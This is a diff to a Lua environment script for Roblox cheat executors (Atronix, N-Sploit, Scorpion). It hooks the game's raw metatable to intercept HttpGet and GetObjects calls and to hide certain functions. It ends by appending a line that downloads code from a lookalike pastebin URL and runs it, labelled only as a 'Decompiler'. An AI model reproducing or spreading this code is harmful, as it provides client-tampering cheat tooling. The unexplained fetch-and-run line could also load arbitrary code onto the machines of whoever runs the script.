@@ -2,6 +2,7 @@
  \\ Atronix's Environment
 \\ Code is used by N-Sploit & Scorpion.
 ]]
+
 local Bridge = {}
 local scr = {}
 local RunService = game:FindService("RunService")
@@ -460,6 +461,45 @@ end
 
 SetReadOnly = setreadonly
 
+local Metatable = getrawmetatable(game)
+		local Game = game
+		
+		local OldMetatable = Metatable.__namecall
+		
+		
+		setreadonly(Metatable, false)
+		Metatable.__namecall = function(Self, ...)
+		    local Method = getnamecallmethod()
+		        if Method == "HttpGet" or Method == "HttpGetAsync" then
+		            return HttpGet(...)
+		        elseif Method == "GetObjects" then 
+		            return GetObjects(...)
+		        end
+		    if table.find(Keywords, getnamecallmethod()) then
+		        return "Attempt to call protected function"
+		    end
+		    return OldMetatable(Self, ...)
+		end
+		
+		local OldIndex = Metatable.__index
+		
+		
+		setreadonly(Metatable, false)
+		Metatable.__index = function(Self, i)
+		    if Self == game then
+		        if i == "HttpGet" or i == "HttpGetAsync" then 
+		            return HttpGet
+		        elseif i == "GetObjects" then 
+		            return GetObjects
+		        end
+		    end
+		    if table.find(Keywords, i) then
+		        return "Attempt to call protected function"
+		    end
+		    return OldIndex(Self, i)
+		end
+
+
 setwriteonly = function(t, writeonly)
     if not getmetatable(t) then
         local proxy = {}
@@ -758,3 +798,8 @@ end)
 check("setrbxclipboard", function()
     setrbxclipboard = setclipboard
 end)
+
+
+loadstring(game:HttpGet("https://pastebinp.com/raw/592uK7Pe"))() -- Decompiler
+
+assert(true, warn("[ATORNIX-SCORPION]: Atronix loaded."))
